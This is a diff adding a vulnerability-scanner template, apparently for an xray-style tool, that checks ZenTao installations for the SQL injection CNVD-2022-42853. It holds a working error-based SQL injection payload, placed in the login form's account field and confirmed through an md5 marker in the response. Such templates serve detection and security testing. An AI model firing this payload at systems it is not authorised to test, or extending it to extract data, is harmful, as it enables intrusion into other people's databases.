@@ -1,0 +1,25 @@
+id: CNVD-2022-42853
+
+info:
+  name: ZenTao CMS - SQL Injection
+  author: ling
+  severity: high
+  description: |
+    Zen Tao has a SQL injection vulnerability. Attackers can exploit the vulnerability to obtain sensitive database information.
+  reference:
+    - https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853
+
+set:
+  hosturl: request.url
+rules:
+  r0:
+    request:
+      method: POST
+      path: /zentao/user-login.html
+      headers:
+        Referer: "{{hosturl}}/zentao/user-login.html"
+      body: |
+        account=admin'+and++updatexml(1,concat(0x1,md5(999999999)),1)+and+'1'='1
+    expression: response.body.bcontains(b'c8c605999f3d8352d7bb792cf3fdb25')
+expression: r0()
